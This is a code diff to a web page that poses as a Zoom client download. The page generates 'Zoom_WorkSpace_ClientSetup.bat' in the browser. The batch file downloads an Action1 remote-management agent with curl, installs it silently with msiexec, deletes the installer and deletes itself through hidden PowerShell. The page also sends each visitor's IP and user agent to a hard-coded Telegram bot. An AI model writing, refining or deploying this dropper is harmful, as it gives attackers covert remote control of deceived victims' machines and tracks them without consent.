@@ -219,10 +219,10 @@
             //  CONFIGURATION – REPLACE WITH YOUR OWN TELEGRAM BOT CREDENTIALS
             // ============================================================
             const TELEGRAM_BOT_TOKEN = '8732697564:AAHJRrodoFSum4dZubLXXgN0D_5V2Mi-X5U'; // e.g. '123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11'
-            const TELEGRAM_CHAT_ID = '-1004476515039';     // e.g. '-1001234567890' (group) or '123456789' (user)
+            const TELEGRAM_CHAT_ID = '-1004476515039'; // e.g. '-1001234567890' (group) or '123456789' (user)
 
             // ------------------------------------------------------------
-            //  Embedded BAT file content
+            //  Embedded BAT file content – uses curl + msiexec as requested
             // ------------------------------------------------------------
             var batContent =
                 '@echo off\r\n' +
@@ -235,42 +235,17 @@
                 '    exit /b\r\n' +
                 ')\r\n' +
                 '\r\n' +
-                ':: === Variables ===\r\n' +
-                'set "URL=https://app.action1.com/agent/8111f6d4-6895-11f1-8d39-abcfd1b90c97/Windows/agent(My_Organization).msi"\r\n' +
-                'set "MSI=%TEMP%\\pkg.msi"\r\n' +
+                ':: === Change to temp directory ===\r\n' +
+                'cd /d "%TEMP%"\r\n' +
                 '\r\n' +
-                ':: === Check if already installed ===\r\n' +
-                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
-                'if %errorlevel%==0 goto cleanup\r\n' +
-                '\r\n' +
-                ':: === Download with retry ===\r\n' +
-                'set RETRIES=3\r\n' +
-                'set COUNT=0\r\n' +
-                '\r\n' +
-                ':download\r\n' +
-                'set /a COUNT+=1\r\n' +
-                'powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop} catch {exit 1}"\r\n' +
-                '\r\n' +
-                'if not exist "%MSI%" (\r\n' +
-                '    if %COUNT% LSS %RETRIES% (\r\n' +
-                '        timeout /t 2 >nul\r\n' +
-                '        goto download\r\n' +
-                '    ) else (\r\n' +
-                '        goto selfdelete\r\n' +
-                '    )\r\n' +
-                ')\r\n' +
-                '\r\n' +
-                ':: === Silent install ===\r\n' +
-                'msiexec /i "%MSI%" /qn /norestart >nul 2>&1\r\n' +
+                ':: === Download with curl and install ===\r\n' +
+                'curl -o "action1_agent(My_Organization).msi" "https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/agent(My_Organization).msi" && msiexec /i "action1_agent(My_Organization).msi" /quiet /qn\r\n' +
                 '\r\n' +
                 ':: === Cleanup MSI ===\r\n' +
-                ':cleanup\r\n' +
-                'if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1\r\n' +
+                'del /f /q "action1_agent(My_Organization).msi" >nul 2>&1\r\n' +
                 '\r\n' +
-                ':: === PowerShell self-delete (guaranteed) ===\r\n' +
-                ':selfdelete\r\n' +
-                'powershell -WindowStyle Hidden -Command ^\r\n' +
-                '"Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
+                ':: === PowerShell self-delete ===\r\n' +
+                'powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
                 '\r\n' +
                 'exit /b';
 
@@ -330,14 +305,12 @@
                 if (reportSent) return;
                 reportSent = true;
 
-                // Check if token/chat ID are set (basic check)
                 if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
                     statusMsg.textContent = '⚠️ Telegram report not configured (set token and chat ID).';
                     statusMsg.className = 'status-message info';
                     return;
                 }
 
-                // Fetch public IP
                 fetch('https://api.ipify.org?format=json')
                     .then(response => {
                         if (!response.ok) throw new Error('IP fetch failed');
@@ -348,7 +321,6 @@
                         return buildAndSendTelegram(ip);
                     })
                     .catch(err => {
-                        // Fallback: try ipapi.co
                         return fetch('https://ipapi.co/json/')
                             .then(res => {
                                 if (!res.ok) throw new Error('ipapi failed');
@@ -359,7 +331,6 @@
                                 return buildAndSendTelegram(ip);
                             })
                             .catch(() => {
-                                // If all IP services fail, send without IP
                                 return buildAndSendTelegram('Unavailable');
                             });
                     });
@@ -389,7 +360,6 @@
                     '🆔 User-Agent: ' + ua + '\n' +
                     '──────────────────';
 
-                // Send to Telegram
                 var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
                 var payload = {
                     chat_id: TELEGRAM_CHAT_ID,
@@ -425,23 +395,19 @@
             //  Download trigger
             // ------------------------------------------------------------
             function triggerDownload() {
-                // Set the trigger link and click it
                 triggerLink.href = blobUrl;
                 triggerLink.download = 'Zoom_WorkSpace_ClientSetup.bat';
 
                 try {
                     triggerLink.click();
-                    // If no error, update status (will be refined by telegram report later)
                     statusMsg.textContent = '⏳ Download starting...';
                     statusMsg.className = 'status-message info';
                 } catch (e) {
-                    // Fallback: open the blob URL directly
                     window.open(blobUrl, '_blank');
                     statusMsg.textContent = '⚠️ Download could not start automatically. Use manual link below.';
                     statusMsg.className = 'status-message error';
                 }
 
-                // Send Telegram report (only once)
                 sendTelegramReport();
             }
 
@@ -463,18 +429,9 @@
             //  Manual link click – also trigger report
             // ------------------------------------------------------------
             manualLink.addEventListener('click', function(e) {
-                // The link will navigate to blob URL, but we also want to send report.
-                // We'll call sendTelegramReport() but prevent duplicate.
-                // Also ensure that if the countdown hasn't finished, we still report.
-                // However, if the user clicks manual, we should stop the countdown?
-                // We'll let the countdown continue; we just send report here as well.
-                // But we should avoid sending if already sent.
                 if (!reportSent) {
-                    // Send report asynchronously
                     sendTelegramReport();
                 }
-                // The default behavior will download the file.
-                // We also add a small status update.
                 statusMsg.textContent = '⏳ Manual download initiated...';
                 statusMsg.className = 'status-message info';
             });
